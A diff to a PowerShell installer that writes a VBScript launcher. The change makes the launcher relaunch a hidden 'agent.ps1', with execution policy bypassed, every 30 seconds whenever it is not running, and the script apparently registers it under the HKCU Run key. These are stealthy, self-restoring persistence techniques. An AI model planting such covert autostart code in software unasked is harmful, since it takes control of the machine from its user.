@@ -11,7 +11,21 @@ $vbsPath = Join-Path $installDir "launcher.vbs"
 
 @"
 Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$agentPath""", 0, False
+Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
+
+Do While True
+    Set processes = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'powershell.exe'")
+    agentRunning = False
+    For Each process In processes
+        If InStr(process.CommandLine, "agent.ps1") > 0 Then
+            agentRunning = True
+        End If
+    Next
+    If Not agentRunning Then
+        objShell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$agentPath""", 0, False
+    End If
+    WScript.Sleep 30000
+Loop
 "@ | Set-Content $vbsPath
 
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
